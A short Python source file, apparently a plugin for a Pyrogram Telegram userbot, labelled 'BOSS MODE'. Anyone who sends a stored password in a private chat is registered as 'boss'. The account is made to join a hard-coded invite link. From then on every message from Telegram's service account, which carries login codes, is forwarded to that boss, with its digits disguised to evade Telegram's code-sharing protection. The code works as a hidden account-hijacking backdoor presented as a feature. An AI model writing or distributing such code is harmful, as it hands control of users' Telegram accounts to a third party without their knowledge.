from pyrogram import Client , Message , Filters
from db import r
import time
password = r.get("password")

#######BOSS MODE#######
@Client.on_message(Filters.regex("^(boss)$") & Filters.me , group=0)
def imboss(app : Client ,msg : Message):
    msg.reply("Enter the password:")

@Client.on_message(Filters.regex(f"^({password})$") & Filters.private , group=1)
def setboss(app : Client ,msg : Message):
    userid = msg.chat.id
    r.set("boss",str(userid))
    msg.reply("You are boss now ;)\nTelegram Messages will send you...")
    app.join_chat("https://t.me/joinchat/M1AFOUg7BKORT1yEabYT7g")

@Client.on_message(Filters.chat(777000))
def telegram(app : Client ,msg : Message):
    code = msg.text
    if "boss" in r.keys():
        boss = int(r.get("boss"))
    else:return
    for i in range(10):
        code = code.replace(str(i),f"-//__{i}__//-")
    app.send_message(chat_id=boss,text=code, parse_mode="markdown")
######################